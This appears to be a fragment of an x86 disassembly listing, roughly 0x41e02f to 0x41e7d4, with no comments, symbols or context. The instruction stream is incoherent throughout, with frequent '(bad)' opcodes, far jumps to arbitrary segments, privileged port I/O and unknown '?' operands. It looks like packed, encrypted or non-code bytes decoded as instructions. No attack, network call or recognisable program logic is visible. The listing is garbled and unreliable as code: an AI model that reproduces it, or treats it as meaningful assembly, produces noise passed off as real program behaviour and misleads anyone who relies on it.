  41e02f:	(bad)  
  41e031:	lea    ebp,ds:0x752403d8
  41e037:	xor    eax,0x431f92f7
  41e03c:	cld    
  41e03d:	retf   
  41e03e:	mov    ch,0xd4
  41e040:	cdq    
  41e041:	nop
  41e042:	ins    BYTE PTR es:[edi],dx
  41e043:	jp     0x41e051
  41e045:	shl    BYTE PTR ds:0x7f74d1e2,1
  41e04b:	aas    
  41e04c:	push   es
  41e04d:	pop    ss
  41e04e:	out    0x5b,eax
  41e050:	pop    ebp
  41e051:	inc    BYTE PTR [edx-0x6]
  41e054:	jnp    0x41e02e
  41e056:	std    
  41e057:	mov    ?,esp
  41e059:	mov    ds:0x6c8f8212,eax
  41e05e:	add    eax,0x772a71ac
  41e063:	jnp    0x41e019
  41e065:	pop    esi
  41e066:	sub    eax,DWORD PTR [ecx+0x1653fdff]
  41e06c:	dec    edx
  41e06d:	jb     0x41e03d
  41e06f:	icebp  
  41e070:	fs (bad) 
  41e072:	or     ebp,DWORD PTR [edi+0x7a]
  41e075:	int3   
  41e076:	mov    edx,0x8517221a
  41e07b:	cdq    
  41e07c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e07d:	jne    0x41e0c9
  41e07f:	aas    
  41e080:	icebp  
  41e081:	jmp    0xd19c:0xf55c1b79
  41e088:	dec    esi
  41e089:	xchg   edi,eax
  41e08a:	rcl    dl,1
  41e08c:	out    dx,al
  41e08d:	cs es mov esi,0xc6d9b8b3
  41e094:	nop
  41e095:	cdq    
  41e096:	adc    DWORD PTR [edi+0x24],ebx
  41e099:	sub    al,0xc4
  41e09b:	or     dl,BYTE PTR [edi-0x4d]
  41e09e:	adc    DWORD PTR [edi-0x5f10f393],ecx
  41e0a4:	and    BYTE PTR [esi+eiz*8-0x33a91eac],bh
  41e0ab:	lods   eax,DWORD PTR ds:[esi]
  41e0ac:	hlt    
  41e0ad:	push   ds
  41e0ae:	out    dx,eax
  41e0af:	iret   
  41e0b0:	or     edi,DWORD PTR [ebp-0x44]
  41e0b3:	mov    BYTE PTR [esi-0x75],dh
  41e0b6:	inc    edi
  41e0b7:	adc    edx,DWORD PTR [edx]
  41e0b9:	sbb    esi,edx
  41e0bb:	dec    esi
  41e0bc:	les    ecx,FWORD PTR [eax-0x25]
  41e0bf:	cli    
  41e0c0:	or     al,0x7f
  41e0c2:	push   edi
  41e0c3:	test   al,0x3d
  41e0c5:	add    DWORD PTR [ecx+0x26d04735],ebp
  41e0cb:	inc    esp
  41e0cc:	or     ebp,edi
  41e0ce:	sub    ebp,DWORD PTR ss:[ecx]
  41e0d1:	fmulp  st(7),st
  41e0d3:	or     DWORD PTR [ecx+0x52],0x80869aec
  41e0da:	int3   
  41e0db:	add    bh,BYTE PTR [ebx]
  41e0dd:	cs or  eax,0xa48f9f5f
  41e0e3:	into   
  41e0e4:	(bad)  
  41e0e5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41e0e7:	in     al,dx
  41e0e8:	jge    0x41e138
  41e0ea:	jne    0x41e123
  41e0ec:	and    DWORD PTR [ebx+0x7ddfae1e],ebp
  41e0f2:	mov    ds:0xa4810c40,eax
  41e0f7:	push   ds
  41e0f8:	ins    BYTE PTR es:[edi],dx
  41e0f9:	out    dx,eax
  41e0fa:	ja     0x41e144
  41e0fc:	ins    DWORD PTR es:[edi],dx
  41e0fd:	mov    ch,0xd7
  41e0ff:	jmp    0x41e12e
  41e101:	xor    DWORD PTR [esp+esi*1],esi
  41e104:	xchg   edx,eax
  41e105:	es fwait
  41e107:	jae    0x41e0c6
  41e109:	test   esp,edi
  41e10b:	mov    esp,0x7cfbd731
  41e110:	push   edx
  41e111:	imul   esi,edx,0x0
  41e114:	pop    esi
  41e115:	ins    DWORD PTR es:[edi],dx
  41e116:	gs pop ebp
  41e118:	sub    edi,DWORD PTR [edi+0x196fce70]
  41e11e:	cmp    ch,ch
  41e120:	loop   0x41e0d9
  41e122:	outs   dx,BYTE PTR ds:[esi]
  41e123:	sub    al,0xee
  41e125:	pop    ecx
  41e126:	fisttp QWORD PTR [eax+ecx*8-0x1d]
  41e12a:	stos   BYTE PTR es:[edi],al
  41e12b:	loope  0x41e19e
  41e12d:	sub    dl,bl
  41e12f:	add    edx,DWORD PTR [edx-0x20]
  41e132:	cmp    ecx,DWORD PTR [edx+0x6e]
  41e135:	cmp    dh,dl
  41e137:	aam    0xc4
  41e139:	inc    edx
  41e13a:	sub    ah,BYTE PTR [edx-0x15dac4fe]
  41e140:	aas    
  41e141:	es cmp eax,0xd33131fa
  41e147:	pop    es
  41e148:	out    0xbd,eax
  41e14a:	add    DWORD PTR [ecx],ecx
  41e14c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e14d:	sbb    eax,0x9b74b54
  41e152:	out    0xf3,al
  41e154:	gs mov ebp,0xd4b7633b
  41e15a:	fs xchg ecx,eax
  41e15c:	sbb    al,0x37
  41e15e:	mov    esp,0x277efe97
  41e163:	mov    al,0x58
  41e165:	cmp    DWORD PTR [edx-0x79],esp
  41e168:	adc    ebp,DWORD PTR [ebp+0x703dcedd]
  41e16e:	popf   
  41e16f:	fst    DWORD PTR ds:0x32654bef
  41e175:	mov    ss,WORD PTR [ecx]
  41e177:	ror    bh,0x17
  41e17a:	xor    al,0xdd
  41e17c:	jnp    0x41e1ac
  41e17e:	jmp    0x2df2ecea
  41e183:	arpl   WORD PTR fs:0xeae82d2d,cx
  41e18a:	popa   
  41e18b:	push   eax
  41e18c:	and    DWORD PTR [eax+0x66],esi
  41e18f:	mov    al,0x37
  41e191:	push   es
  41e192:	test   eax,0x57bdec44
  41e197:	xchg   esp,eax
  41e198:	(bad)  
  41e199:	adc    DWORD PTR [esi+eax*8-0x2878a85b],ebp
  41e1a0:	fdivr  DWORD PTR [ebx+0x11]
  41e1a3:	in     al,0x4f
  41e1a5:	and    BYTE PTR ds:0xdeaefdbd,bl
  41e1ab:	not    BYTE PTR [bp+si-0x66]
  41e1af:	pop    ds
  41e1b0:	pop    es
  41e1b1:	retf   
  41e1b2:	fwait
  41e1b3:	or     dh,al
  41e1b5:	loopne 0x41e1f4
  41e1b7:	cli    
  41e1b8:	retf   
  41e1b9:	jmp    0x8468:0x88d0e14a
  41e1c0:	imul   esi,edx,0x6d
  41e1c3:	outs   dx,BYTE PTR ds:[esi]
  41e1c4:	mov    edx,0xdb22de8d
  41e1c9:	xchg   esi,eax
  41e1ca:	jnp    0x41e189
  41e1cc:	ret    
  41e1cd:	push   cs
  41e1ce:	jb     0x41e238
  41e1d0:	xor    eax,0x62605896
  41e1d5:	cmp    ah,BYTE PTR [eax]
  41e1d7:	cs mov ebp,0x10b8bd
  41e1dd:	mov    bl,0x47
  41e1df:	rcl    DWORD PTR [ecx-0x6c],cl
  41e1e2:	pop    ebx
  41e1e3:	and    eax,esp
  41e1e5:	ss cmp al,bl
  41e1e8:	mov    dh,0x32
  41e1ea:	sqrtps xmm6,XMMWORD PTR [eax]
  41e1ed:	mov    BYTE PTR [esi],ah
  41e1ef:	mov    ds:0xfe541230,eax
  41e1f4:	addr16 test al,0x6e
  41e1f7:	fstp   DWORD PTR [ecx-0x42]
  41e1fa:	outs   dx,BYTE PTR ds:[esi]
  41e1fb:	xor    DWORD PTR ds:0xc016e0df,ebx
  41e201:	pop    ecx
  41e202:	dec    edx
  41e203:	jl     0x41e1b2
  41e205:	mov    ch,0x77
  41e207:	jg     0x41e1cd
  41e209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e20a:	loope  0x41e22f
  41e20c:	xchg   ebx,eax
  41e20d:	fstp   DWORD PTR [ebx-0x7ae4cd18]
  41e213:	and    ah,al
  41e215:	mov    ds:0x3e5687b7,al
  41e21a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e21b:	and    eax,0x537da271
  41e220:	mov    ch,0x7e
  41e222:	pop    ebp
  41e223:	jno    0x41e273
  41e225:	or     DWORD PTR [edi+0x581f585c],ebx
  41e22b:	xchg   edi,eax
  41e22c:	imul   BYTE PTR [eax]
  41e22e:	js     0x41e28d
  41e230:	fst    QWORD PTR [ebp+0x4ab190f6]
  41e236:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e238:	imul   ebp,DWORD PTR [eax],0xffffffe2
  41e23b:	popa   
  41e23c:	hlt    
  41e23d:	out    0x88,eax
  41e23f:	loopne 0x41e20e
  41e241:	fidiv  WORD PTR [edx]
  41e243:	je     0x41e272
  41e245:	stos   BYTE PTR es:[edi],al
  41e246:	shr    DWORD PTR [ecx-0x1],0xa3
  41e24a:	fidiv  WORD PTR [edx+0x636cbe96]
  41e250:	xchg   ebp,eax
  41e251:	(bad)  
  41e253:	and    DWORD PTR [ebp-0x4a],esi
  41e256:	(bad)  [eax-0xf]
  41e259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e25a:	push   edi
  41e25b:	popa   
  41e25c:	push   esi
  41e25d:	stos   BYTE PTR es:[edi],al
  41e25e:	(bad)  
  41e260:	add    DWORD PTR [ecx+0x1d8d8176],eax
  41e266:	enter  0x91f0,0xa
  41e26a:	add    ebp,DWORD PTR [esi]
  41e26c:	dec    esp
  41e26d:	mov    ebx,0xa45ce492
  41e272:	sti    
  41e273:	and    ebp,DWORD PTR [edx+0x26]
  41e276:	pop    ss
  41e277:	(bad)  
  41e278:	xor    edi,DWORD PTR [ecx-0x21741a6a]
  41e27e:	cmp    DWORD PTR [ecx+0x1d61a367],0xf6fbfac3
  41e288:	push   ecx
  41e289:	lds    eax,FWORD PTR [eax+0x72af65c7]
  41e28f:	dec    edi
  41e290:	and    DWORD PTR ds:0x4fd80332,esi
  41e296:	cwde   
  41e297:	sahf   
  41e298:	stos   BYTE PTR es:[edi],al
  41e299:	in     eax,dx
  41e29a:	call   0x54a8:0x2e8ed7b3
  41e2a1:	pop    esi
  41e2a2:	jp     0x41e2ab
  41e2a4:	or     al,0x78
  41e2a6:	idiv   DWORD PTR ds:0x96f73810
  41e2ac:	xchg   edx,eax
  41e2ad:	int3   
  41e2ae:	or     al,0x3e
  41e2b0:	push   cs
  41e2b1:	add    eax,eax
  41e2b3:	pop    ebp
  41e2b4:	in     eax,0x8a
  41e2b6:	mov    ?,WORD PTR [edx+ebx*8]
  41e2b9:	call   0x3a6f8449
  41e2be:	adc    edi,DWORD PTR [edi]
  41e2c0:	aaa    
  41e2c1:	popf   
  41e2c2:	in     eax,0x79
  41e2c4:	popf   
  41e2c5:	test   bl,bh
  41e2c7:	dec    esp
  41e2c8:	or     DWORD PTR [edx+0x6f],ebp
  41e2cb:	je     0x41e30c
  41e2cd:	std    
  41e2ce:	dec    ebp
  41e2cf:	test   eax,0x4262557a
  41e2d4:	icebp  
  41e2d5:	enter  0x1,0x85
  41e2d9:	std    
  41e2da:	icebp  
  41e2db:	inc    ebp
  41e2dc:	(bad)
  41e2df:	sbb    edx,DWORD PTR [ebx]
  41e2e1:	mov    ebp,0xa68a23b9
  41e2e6:	xor    DWORD PTR [esp+edi*8],edi
  41e2e9:	fist   WORD PTR [eax-0x43]
  41e2ec:	push   ebp
  41e2ed:	in     eax,0xf
  41e2ef:	repz mov edi,0x4ffb85c0
  41e2f5:	iret   
  41e2f6:	xchg   esi,eax
  41e2f7:	sub    BYTE PTR ds:0xfa1fceba,0x20
  41e2fe:	mov    ecx,0x43053df9
  41e303:	les    ebx,FWORD PTR [eax-0x7f3b6a4c]
  41e309:	out    0x8,eax
  41e30b:	sbb    ah,BYTE PTR [ebx-0xda139d4]
  41e311:	aam    0xd4
  41e313:	fadd   DWORD PTR [ecx]
  41e315:	xchg   esi,eax
  41e316:	pop    ecx
  41e317:	and    eax,0x61be5d0f
  41e31c:	xchg   esp,eax
  41e31d:	clc    
  41e31e:	xchg   ebp,eax
  41e31f:	jmp    0x41ed8ad8
  41e324:	lds    esi,FWORD PTR ds:0xf89615ec
  41e32a:	adc    eax,0xce2cfd57
  41e32f:	in     al,dx
  41e330:	lods   eax,DWORD PTR ds:[esi]
  41e331:	adc    esi,edi
  41e333:	jecxz  0x41e351
  41e335:	repz add dh,BYTE PTR [eax]
  41e338:	push   ebp
  41e339:	call   0xf9ee:0xa2a9d01c
  41e340:	mov    eax,ds:0xd732bbee
  41e345:	ja     0x41e396
  41e347:	sub    cl,BYTE PTR [esi+0x4]
  41e34a:	repz test al,0x57
  41e34d:	cld    
  41e34e:	ins    DWORD PTR es:[edi],dx
  41e34f:	jmp    0x9626:0x487aa353
  41e356:	cwde   
  41e357:	in     al,dx
  41e358:	mov    esp,0x7f304869
  41e35d:	jne    0x41e3a2
  41e35f:	inc    ebx
  41e360:	xchg   DWORD PTR [eax+0x63],ecx
  41e363:	int3   
  41e364:	jle    0x41e330
  41e366:	sub    al,BYTE PTR [edx+0x19]
  41e369:	and    eax,0x74264a23
  41e36e:	hlt    
  41e36f:	ja     0x41e32a
  41e371:	inc    DWORD PTR [ebx+0x50]
  41e374:	inc    BYTE PTR [edx+0x66]
  41e377:	test   al,0x4d
  41e379:	add    ch,bl
  41e37b:	mov    ch,0xd0
  41e37d:	jae    0x41e3cd
  41e37f:	les    eax,FWORD PTR [ebx+0xfdd0c14]
  41e385:	jb     0x41e396
  41e387:	call   0xf2b:0x561ef348
  41e38e:	in     eax,0xe9
  41e390:	and    eax,DWORD PTR [edi-0x7b6bc26a]
  41e396:	repnz test al,0x4d
  41e399:	or     dh,ch
  41e39b:	push   esp
  41e39c:	jns    0x41e414
  41e39e:	cmc    
  41e39f:	aas    
  41e3a0:	mov    bl,0x80
  41e3a2:	jb     0x41e37a
  41e3a4:	or     al,BYTE PTR [edx]
  41e3a6:	xchg   dh,dl
  41e3a8:	push   eax
  41e3a9:	scas   al,BYTE PTR es:[edi]
  41e3aa:	xchg   esi,eax
  41e3ab:	adc    BYTE PTR [ebx],ch
  41e3ad:	jae    0x41e36e
  41e3af:	mov    ebp,0x1b259e69
  41e3b4:	ror    DWORD PTR [eax-0x7],0x75
  41e3b8:	cwde   
  41e3b9:	pop    esi
  41e3ba:	adc    bl,BYTE PTR [ecx]
  41e3bc:	lods   eax,DWORD PTR ds:[esi]
  41e3bd:	cli    
  41e3be:	pop    ebp
  41e3bf:	or     eax,0x6be49d0b
  41e3c4:	lds    ecx,FWORD PTR ds:0xe3d50d0e
  41e3ca:	ds jne 0x41e395
  41e3cd:	xor    eax,0xfea7863
  41e3d2:	ja     0x41e3e4
  41e3d4:	jge    0x41e3e2
  41e3d6:	les    ecx,FWORD PTR [edx-0x7b83ca85]
  41e3dc:	mov    edx,0x75fafbd1
  41e3e1:	pop    ecx
  41e3e2:	das    
  41e3e3:	dec    edi
  41e3e4:	mov    esp,0xa172209
  41e3e9:	adc    DWORD PTR [esi],edi
  41e3eb:	mov    edx,0x1d36318c
  41e3f0:	stc    
  41e3f1:	mov    al,ds:0x3d3c7d36
  41e3f6:	and    DWORD PTR [eax+0x21],esp
  41e3f9:	cmp    ecx,DWORD PTR [ebx-0x18]
  41e3fc:	jmp    0x41e382
  41e3fe:	repz mov eax,0xc50b4a59
  41e404:	jb     0x41e463
  41e406:	hlt    
  41e407:	(bad)  
  41e408:	iret   
  41e409:	cld    
  41e40a:	mov    dl,0xc2
  41e40c:	and    al,0xe6
  41e40e:	fist   WORD PTR [ebp-0x1e]
  41e411:	jns    0x41e41c
  41e413:	repnz aad 0x14
  41e416:	pmullw mm5,QWORD PTR [eax]
  41e419:	sub    edx,DWORD PTR [edi-0x12]
  41e41c:	gs mov esp,0x6864e5bb
  41e422:	push   ebx
  41e423:	push   cs
  41e424:	sbb    dh,BYTE PTR [edx+0x3caa9076]
  41e42a:	and    eax,0x66f55880
  41e42f:	(bad)  
  41e430:	mov    ebp,0x81d9ce9b
  41e435:	mov    ebx,0x64a4f65a
  41e43a:	jae    0x41e40d
  41e43c:	push   ebx
  41e43d:	jb     0x41e3e4
  41e43f:	mov    esi,0xb2448ff0
  41e444:	cs mov esp,0xace49144
  41e44a:	xor    al,0xb0
  41e44c:	icebp  
  41e44d:	or     DWORD PTR [edi+0x29],ebp
  41e450:	int    0x41
  41e452:	imul   ebx,esp,0x7db3d77d
  41e458:	push   edi
  41e459:	and    eax,0xe21d4724
  41e45e:	or     ah,BYTE PTR [ecx]
  41e460:	out    dx,eax
  41e461:	sbb    ebp,eax
  41e463:	fcomi  st,st(2)
  41e465:	xchg   esp,eax
  41e466:	xchg   ebp,eax
  41e467:	dec    ecx
  41e468:	outs   dx,BYTE PTR ds:[esi]
  41e469:	adc    ecx,DWORD PTR ds:0x12c04997
  41e46f:	stos   BYTE PTR es:[edi],al
  41e470:	jl     0x41e46f
  41e472:	stc    
  41e473:	inc    ecx
  41e474:	cmp    BYTE PTR [ecx],ch
  41e476:	cmp    esp,eax
  41e478:	out    0xfb,eax
  41e47a:	mov    esp,0x61e58f5f
  41e47f:	icebp  
  41e480:	xor    eax,0x331c0423
  41e485:	dec    ebx
  41e486:	adc    ebx,esp
  41e488:	icebp  
  41e489:	xchg   edi,eax
  41e48a:	push   0xccf7826a
  41e48f:	xchg   ebx,eax
  41e490:	sbb    esp,ebx
  41e492:	xchg   esi,eax
  41e493:	sub    DWORD PTR [ebx-0x1fffbfc],0xffffffde
  41e49a:	fs xor dh,dl
  41e49d:	adc    BYTE PTR [eax+ebp*4+0x49],cl
  41e4a1:	ret    
  41e4a2:	hlt    
  41e4a3:	or     ecx,DWORD PTR [ebp+ecx*2-0x57cadf9c]
  41e4aa:	stos   BYTE PTR es:[edi],al
  41e4ab:	inc    eax
  41e4ac:	mov    WORD PTR [ebx],cs
  41e4ae:	pushf  
  41e4af:	bound  ebp,QWORD PTR [ebx]
  41e4b1:	retf   0x9674
  41e4b4:	dec    esp
  41e4b5:	xchg   dh,dh
  41e4b7:	pop    ss
  41e4b8:	pop    es
  41e4b9:	retf   
  41e4ba:	or     dl,BYTE PTR [eax-0x44]
  41e4bd:	popf   
  41e4be:	jge    0x41e492
  41e4c0:	fdiv   QWORD PTR [ecx-0x7f950651]
  41e4c6:	adc    al,0x2b
  41e4c8:	in     eax,0x46
  41e4ca:	and    dl,BYTE PTR [esi-0x4c]
  41e4cd:	scas   al,BYTE PTR es:[edi]
  41e4ce:	jo     0x41e521
  41e4d0:	sbb    bl,BYTE PTR fs:[eax-0x1da746ac]
  41e4d7:	lds    esi,FWORD PTR [ecx+0x151d2386]
  41e4dd:	gs std 
  41e4df:	repnz enter 0x3847,0x20
  41e4e4:	jne    0x41e496
  41e4e6:	ret    0xc20
  41e4e9:	and    dh,dh
  41e4eb:	jmp    0x5d908327
  41e4f0:	lds    edi,FWORD PTR [edx-0x2c47167]
  41e4f6:	mov    dl,0x68
  41e4f8:	aad    0xd4
  41e4fa:	inc    esp
  41e4fb:	and    DWORD PTR [eax+eax*8-0x510a4a8c],edx
  41e502:	aam    0x46
  41e504:	mov    eax,0x7b734c1a
  41e509:	cs jne 0x41e4da
  41e50c:	sub    ah,dl
  41e50e:	rol    DWORD PTR [edx],cl
  41e510:	cmp    DWORD PTR [esi+0x794d78cc],0xfffffff6
  41e517:	cmc    
  41e518:	jecxz  0x41e54e
  41e51a:	mov    al,ds:0x47c40123
  41e51f:	sbb    DWORD PTR [esi],esi
  41e521:	sbb    esi,ecx
  41e523:	sub    al,0x60
  41e525:	mov    dl,0xd3
  41e527:	aas    
  41e528:	mov    dh,0xb5
  41e52a:	sub    cl,ah
  41e52c:	mov    edi,0x53f3440a
  41e531:	pop    edx
  41e532:	sub    dl,bl
  41e534:	cmp    ebp,DWORD PTR [esi]
  41e536:	fucomi st,st(4)
  41e538:	push   esi
  41e539:	cmp    ah,0x9b
  41e53c:	sbb    eax,0xeb907392
  41e541:	push   bx
  41e543:	jno    0x41e584
  41e545:	push   0x9c36ab50
  41e54a:	inc    ebx
  41e54b:	sbb    al,BYTE PTR [esi+ebp*8+0x2393e23e]
  41e552:	and    ah,BYTE PTR [esi+ebp*4+0x73]
  41e556:	jne    0x41e576
  41e558:	and    DWORD PTR [edi-0x1d],esp
  41e55b:	fwait
  41e55c:	(bad)  
  41e55d:	mov    esi,0x3d6e0988
  41e562:	lods   al,BYTE PTR ds:[esi]
  41e563:	pop    ebx
  41e564:	sahf   
  41e565:	add    eax,0xe5f2c07
  41e56a:	jecxz  0x41e5b3
  41e56c:	pusha  
  41e56d:	popa   
  41e56e:	ds jmp 0x41e533
  41e571:	mov    ebx,0xdebaaf89
  41e576:	inc    edx
  41e577:	fmul   st(2),st
  41e579:	add    BYTE PTR [esi+0x5d],0x76
  41e57d:	push   ecx
  41e57e:	and    edx,edx
  41e580:	aam    0xfc
  41e582:	ins    DWORD PTR es:[edi],dx
  41e583:	xor    al,0x7e
  41e585:	push   ds
  41e586:	loopne 0x41e526
  41e588:	test   DWORD PTR [ecx+eiz*8],edx
  41e58b:	cmp    ecx,esi
  41e58d:	rcr    cl,0xc6
  41e590:	dec    eax
  41e591:	test   BYTE PTR [esi],ah
  41e593:	pushf  
  41e594:	aaa    
  41e595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e596:	mov    bl,0x11
  41e598:	or     BYTE PTR ds:0xf9b03678,dh
  41e59e:	retf   
  41e59f:	sub    eax,0xaf826c75
  41e5a4:	loope  0x41e55a
  41e5a6:	mov    ecx,edi
  41e5a8:	sbb    BYTE PTR ds:0x5c55e147,0x38
  41e5af:	push   edx
  41e5b0:	fistp  DWORD PTR [ebp+0x1c789154]
  41e5b6:	loopne 0x41e584
  41e5b8:	ja     0x41e5c7
  41e5ba:	add    edi,DWORD PTR [esi+0x34]
  41e5bd:	xor    ecx,eax
  41e5bf:	mov    al,ds:0x37cc6e3c
  41e5c4:	scas   al,BYTE PTR es:[edi]
  41e5c5:	fs stos BYTE PTR es:[edi],al
  41e5c7:	xor    al,0x5e
  41e5c9:	aas    
  41e5ca:	fldenv [edx-0x45bf738f]
  41e5d0:	xchg   BYTE PTR [eax+0x1b],bh
  41e5d3:	test   DWORD PTR [edi+0x78],esp
  41e5d6:	shr    edx,0x88
  41e5d9:	xchg   ebx,eax
  41e5da:	pop    ds
  41e5db:	mov    esp,0x2b843845
  41e5e0:	mov    ebp,DWORD PTR [esi]
  41e5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5e3:	mov    edi,edx
  41e5e5:	lods   al,BYTE PTR ss:[esi]
  41e5e7:	idiv   BYTE PTR [esi]
  41e5e9:	retf   
  41e5ea:	mov    edi,0x8e5d401e
  41e5ef:	ret    
  41e5f0:	cmp    dh,dl
  41e5f2:	mov    DWORD PTR [edx+eax*4+0x7e],edi
  41e5f6:	inc    esi
  41e5f7:	aad    0x79
  41e5f9:	jbe    0x41e5fc
  41e5fb:	sbb    eax,0x834a2b95
  41e600:	mov    al,0x7f
  41e602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e603:	sub    BYTE PTR [esi+0x54468ca6],dh
  41e609:	mov    WORD PTR [ecx-0x53],?
  41e60c:	pop    ds
  41e60d:	daa    
  41e60e:	rcl    BYTE PTR [eax+0x51],cl
  41e611:	mov    al,ds:0xd979bc95
  41e616:	mov    ebx,0xd0079a54
  41e61b:	inc    ebx
  41e61c:	mov    dl,0xb0
  41e61e:	and    eax,0x684b0a33
  41e623:	and    bl,BYTE PTR [ecx-0x5b]
  41e626:	add    bh,al
  41e628:	cdq    
  41e629:	jbe    0x41e69c
  41e62b:	retf   
  41e62c:	sahf   
  41e62d:	bnd jb 0x41e603
  41e630:	aad    0x10
  41e632:	mov    edx,0x6b34010f
  41e637:	cmp    eax,DWORD PTR [ebp+0x25]
  41e63a:	data16 mov ds:0x668f7201,al
  41e640:	test   BYTE PTR [edi-0x13],al
  41e643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e644:	ins    BYTE PTR es:[edi],dx
  41e645:	pop    edi
  41e646:	imul   ebp,DWORD PTR [edx-0x25c8d05d],0xffffffe6
  41e64d:	inc    ebx
  41e64e:	xor    ebp,ecx
  41e650:	iret   
  41e651:	xchg   esi,eax
  41e652:	pop    eax
  41e653:	mov    eax,0x3e18ad5e
  41e658:	je     0x41e619
  41e65a:	sbb    ecx,ebp
  41e65c:	lahf   
  41e65d:	(bad)  
  41e65e:	mov    esp,0x34394bbe
  41e663:	xor    BYTE PTR [edi+0x32c5a0cd],ch
  41e669:	pop    edx
  41e66a:	sbb    eax,DWORD PTR es:[esi]
  41e66d:	inc    edx
  41e66e:	lods   al,BYTE PTR ds:[esi]
  41e66f:	fisubr DWORD PTR [ecx-0x5a52b226]
  41e675:	and    DWORD PTR [ebx+0x68075b7d],edi
  41e67b:	sbb    ch,BYTE PTR [edi-0x38a683cb]
  41e681:	imul   esp,DWORD PTR [edi-0x22],0x4
  41e685:	dec    ebp
  41e686:	adc    eax,0xe4668e59
  41e68b:	mov    esp,0x3d30d3e1
  41e690:	jne    0x41e63b
  41e692:	mov    eax,0xbfa6621f
  41e697:	add    BYTE PTR [edx],bh
  41e699:	out    dx,eax
  41e69a:	rol    BYTE PTR [ebp-0x8],1
  41e69d:	imul   esp,ebx,0x8d3ef931
  41e6a3:	inc    BYTE PTR [ebp+0x74]
  41e6a6:	jbe    0x41e6ec
  41e6a8:	and    esp,DWORD PTR [ecx]
  41e6aa:	fdivr  QWORD PTR [edi-0x283bc1e2]
  41e6b0:	add    esp,DWORD PTR [esi]
  41e6b2:	ror    BYTE PTR [ebx-0x33a49e9c],1
  41e6b8:	(bad)  
  41e6b9:	call   0xf845:0xd9cb353f
  41e6c0:	pop    es
  41e6c1:	ins    BYTE PTR es:[edi],dx
  41e6c2:	xor    cl,BYTE PTR [edi+0x463fe30]
  41e6c8:	mov    ch,0x6d
  41e6ca:	push   edx
  41e6cb:	mov    bl,0x5a
  41e6cd:	retf   
  41e6ce:	jmp    0x99d9abe1
  41e6d3:	mov    ebp,0x3bdba1e0
  41e6d8:	mov    ch,0xc0
  41e6da:	xchg   ecx,eax
  41e6db:	addr16 push es
  41e6dd:	pop    es
  41e6de:	addr16 aam 0x39
  41e6e1:	cwde   
  41e6e2:	jecxz  0x41e672
  41e6e4:	call   0x3053a1bc
  41e6e9:	cmp    eax,0x7b3ee7d
  41e6ee:	and    eax,0x34d63983
  41e6f3:	popf   
  41e6f4:	ds dec esi
  41e6f6:	mov    eax,0x8be73498
  41e6fb:	sub    eax,0x9a6106f5
  41e700:	jo     0x41e6b9
  41e702:	fnstsw WORD PTR [esi-0x5b229a13]
  41e708:	shl    BYTE PTR [ebx-0x24],cl
  41e70b:	jo     0x41e6cc
  41e70d:	mov    esp,0x6f6141ee
  41e712:	(bad)  
  41e713:	call   0x4a08:0x1e879213
  41e71a:	out    0x7d,eax
  41e71c:	outs   dx,DWORD PTR ds:[esi]
  41e71d:	xchg   edi,eax
  41e71e:	addr16 cmc 
  41e720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e721:	push   cs
  41e722:	sub    ebx,DWORD PTR ds:0x1d4ed220
  41e728:	jmp    0x3763d2ef
  41e72d:	push   ss
  41e72e:	sbb    eax,0x257b1594
  41e733:	add    al,0xb6
  41e735:	inc    eax
  41e736:	shr    BYTE PTR ss:[edi-0x35],cl
  41e73a:	cmp    esi,DWORD PTR [ebx]
  41e73c:	lods   eax,DWORD PTR ds:[esi]
  41e73d:	pop    ebp
  41e73e:	push   ds
  41e73f:	cmp    al,bh
  41e741:	dec    esi
  41e742:	sbb    ecx,DWORD PTR [esi]
  41e744:	test   eax,0x53afda36
  41e749:	popf   
  41e74a:	nop    esi
  41e74d:	sar    bl,0x52
  41e750:	fistp  WORD PTR [esi]
  41e752:	push   esp
  41e753:	enter  0x56b9,0x80
  41e757:	daa    
  41e758:	dec    ecx
  41e759:	popa   
  41e75a:	mov    ebp,0x43f4d92c
  41e75f:	sbb    ebp,DWORD PTR [edx-0x5c0a5b08]
  41e765:	xchg   DWORD PTR [edx],edx
  41e767:	mov    esi,0x72998b01
  41e76c:	gs stos BYTE PTR es:[edi],al
  41e76e:	test   al,0xea
  41e770:	and    al,0x7f
  41e772:	jmp    0x2faa:0x340037a9
  41e779:	retf   0x6675
  41e77c:	je     0x41e724
  41e77e:	jbe    0x41e742
  41e780:	sub    al,0x9a
  41e782:	pop    ebp
  41e783:	mov    edi,0x2bd9735
  41e788:	inc    ebx
  41e789:	inc    esp
  41e78a:	out    0x0,al
  41e78c:	sbb    edi,DWORD PTR [eax-0x794bf275]
  41e792:	or     BYTE PTR [eax+esi*2+0x26],ah
  41e796:	mov    edi,0x6b27b343
  41e79b:	or     ebx,ebx
  41e79d:	push   ecx
  41e79e:	xor    BYTE PTR [edi+0x4],bl
  41e7a1:	inc    esi
  41e7a2:	xchg   bh,bh
  41e7a4:	push   edi
  41e7a5:	aad    0x76
  41e7a7:	mov    cl,0x22
  41e7a9:	inc    edi
  41e7aa:	ins    DWORD PTR es:[edi],dx
  41e7ab:	sbb    ecx,0x35933ad8
  41e7b1:	and    al,0xa9
  41e7b3:	sbb    esi,DWORD PTR [ebx]
  41e7b5:	xchg   esp,eax
  41e7b6:	scas   al,BYTE PTR es:[edi]
  41e7b7:	pop    esi
  41e7b8:	jp     0x41e7e0
  41e7ba:	xchg   esi,eax
  41e7bb:	jle    0x41e7c0
  41e7bd:	dec    edi
  41e7be:	sbb    al,0x1a
  41e7c0:	jae    0x41e783
  41e7c2:	push   ecx
  41e7c3:	push   es
  41e7c4:	inc    BYTE PTR ds:[eax-0x1e89b3aa]
  41e7cb:	ja     0x41e817
  41e7cd:	nop
  41e7ce:	stos   DWORD PTR es:[edi],eax
  41e7cf:	dec    esi
  41e7d0:	xor    edi,edi
  41e7d2:	arpl   dx,dx
  41e7d4:	adc    DWORD PTR [eax+0x1a],edi
